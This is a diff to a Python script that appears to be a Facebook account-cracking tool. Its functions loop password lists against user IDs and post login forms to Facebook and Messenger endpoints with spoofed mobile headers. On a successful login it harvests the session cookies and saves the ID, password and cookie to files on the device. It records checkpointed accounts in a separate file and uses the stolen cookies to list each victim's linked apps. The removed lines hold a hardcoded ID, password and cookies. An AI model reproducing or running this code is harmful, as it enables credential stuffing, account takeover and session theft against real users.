@@ -607,7 +607,8 @@ def malaysia():
 		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
 		menu()
-		
+
+
 #__________________| FILE METHOD M1 |__________________#
 def api1(ids,names,passlist):
         try:
@@ -1355,7 +1356,26 @@ def rndm4(uid,passlist):
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
                                         open('/sdcard/BITHIKA-RANDOM-M4-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(cid)
-                                        cek_apk(session, coki)
+                                        w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": coki}).text
+                                        sop = BeautifulSoup(w, "html.parser")
+                                        x = sop.find("form", method="post")
+                                        game = [i.text for i in x.find_all("h3")]
+                                        if len(game) == 0:
+                                            print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s		' % (N, H, N, H, N))
+                                        else:
+                                           print(f'\r{A} [•]%s Active Apks & Web 👇 ' % (H))
+                                           for i in range(len(game)):
+                                              print(f"\r%s [%s] %s %s " % (D, i + 1, game[i].replace("Added on", " Added on"), D))
+                                        w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": coki}).text
+                                        sop = BeautifulSoup(w, "html.parser")
+                                        x = sop.find("form", method="post")
+                                        game = [i.text for i in x.find_all("h3")]
+                                        if len(game) == 0:
+                                            print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s		' % (N, M, N, M, N))
+                                        else:
+                                           print(f'\r{A} [•]%s Expired Apks & Web 👇 ' % (M))
+                                           for i in range(len(game)):
+                                              print(f"\r%s [%s] %s %s " % (C, i + 1, game[i].replace("Expired", " Expired"), A))
                                         return True
                         elif 'checkpoint' in log_cookies:
                                         coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1381,52 +1401,67 @@ def rndm5(uid,passlist):
         au=Ugen()
         try:
                 for pas in passlist:
-                        free_fb = session.get(f'https://www.messenger.com').text
-                        data ={'jazoest':re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+                        ses.headers.update({"Host":"m.facebook.com",'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1',"upgrade-insecure-requests":"1","user-agent":au,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+                        free_fb = session.get(f'https://free.facebook.com').text
+                        data = {'m_ts':re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+'li':re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+'try_number': '0',
+'unrecognized_tries': '0',
+'email': uid,
+'prefill_contact_point': '',
+'prefill_source': '',
+'prefill_type': '',
+'first_prefill_source': '',
+'first_prefill_type': '',
+'had_cp_prefilled': 'false',
+'had_password_prefilled': 'false',
+'is_smart_lock': 'true',
+'bi_xrwh': '0',
+'pass': pas,
+'jazoest':re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
 'lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-'initial_request_id': 'Ab9rXVaqYtjLARnu1FsGwTq',
-'timezone': '-330',
-'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-'lgnrnd': '055850_c2gE',
-'lgnjs': 'n',
-'email': '61559841968869',
-'pass': '961825',
-'default_persistent': '',}
-                        headers={'Host': 'www.messenger.com',
-'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-'Accept-Language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
-'Cache-Control': 'max-age=0',
-'Content-Type': 'application/x-www-form-urlencoded',
-'Cookie': 'datr=-AfXZhh2mJijm2B4WGrNQFPW; sb=CQjXZg29gHjxhOY9RLl3yjXj; wd=885x773',
-'Origin': 'https://www.messenger.com',
-'Priority': 'u=0, i',
-'Referer': 'https://www.messenger.com/login/password/',
-'Sec-CH-UA': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
-'Sec-CH-UA-Mobile': '?0',
-'Sec-CH-UA-Platform': '"Windows"',
-'Sec-Fetch-Dest': 'document',
-'Sec-Fetch-Mode': 'navigate',
-'Sec-Fetch-Site': 'same-origin',
-'Sec-Fetch-User': '?1',
-'Upgrade-Insecure-Requests': '1',
-'User-Agent': au,
-'Content-Length': '417',}
-                        response=session.post(f'https://www.messenger.com/login/password/',data=data,headers=headers).text
+'dyn': '',
+'csr': '',
+'req': 'k',
+'a': '',
+'__user': '0',
+'_fb_noscript': 'true'}
+                        headers={'authority': 'm.facebook.com',
+'accept': '*/*',
+'accept-language': 'en-US,en;q=0.9',
+'content-type': 'application/x-www-form-urlencoded',
+'origin': 'https://m.facebook.com',
+'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=114946765277597&kid_directed_site=0&app_id=114946765277597&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D114946765277597%26auth_type%3Dreauthorize%26cbt%3D1723457889584%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcd17ca0a76dc63a8%2526domain%253Dwww.vecteezy.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.vecteezy.com%25252Ff07b3d8c5688e23bb%2526relation%253Dopener%26client_id%3D114946765277597%26display%3Dpopup%26domain%3Dwww.vecteezy.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.vecteezy.com%252Ffree-videos%252Fcall-to-action-button%253Fpage%253D2%2526srsltid%253DAfmBOoobRdAd8ZTHYUx2XPTH6ck4ZRdyQkFXqUHnpiEXYQH1js0u4jnB%26locale%3Den_US%26logger_id%3Df5dd8ebc54f54b7e1%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df23016ed68f160ca4%2526domain%253Dwww.vecteezy.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.vecteezy.com%25252Ff07b3d8c5688e23bb%2526relation%253Dopener%2526frame%253Df601eb188acd9eb67%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv3.2%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df23016ed68f160ca4%26domain%3Dwww.vecteezy.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.vecteezy.com%252Ff07b3d8c5688e23bb%26relation%3Dopener%26frame%3Df601eb188acd9eb67%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=popup&locale=en_GB&pl_dbl=0',
+'sec-ch-prefers-color-scheme': 'dark',
+'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+'sec-ch-ua-mobile': '?1',
+'sec-ch-ua-model': '"23128PC33I"',
+'sec-ch-ua-platform': '"Android"',
+'sec-ch-ua-platform-version': '"13"',
+'sec-fetch-dest': 'empty',
+'sec-fetch-mode': 'cors',
+'sec-fetch-site': 'same-origin',
+'user-agent': au,
+'x-asbd-id': '129477',
+'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
+                        session.post(f'https://mbasic.facebook.com/login/device-based/login/async/',data=data,headers=headers).text
                         log_cookies=session.cookies.get_dict().keys()
-                        if 'some_key' in log_cookies:
-                                        coki= ";".join([f"{key}={value}" for key, value in log_cookies.items()])
-                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                        if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
+                                        coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
+                                        cid = re.findall('c_user=(.*);xs', coki)[0]
+                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
-                                        open('/sdcard/BITHIKA-RANDOM-M2-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
-                                        oks.append(uid)
+                                        open('/sdcard/BITHIKA-RANDOM-M5-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
+                                        oks.append(cid)
                                         cek_apk(session, coki)
                                         return True
-                        elif 'c_user' in log_cookies:
+                        elif 'checkpoint' in log_cookies:
                                         coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                                         coki1 = coki.split("1000")[1]
                                         uid = "1000"+coki1[0:11]
-                                        print(f'\r\r{G}[{Y}JEEVAN-CP{G}]{Y} '+uid+' || '+pas+'\033[1;97m')
-                                        open('/sdcard/JEEVAN-CP.txt','a').write(uid+'|'+pas+'\n')
+                                        print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/BITHIKA-CP.txt','a').write(uid+'|'+pas+'\n')
                                         cps.append(uid)
                                         return True
                                
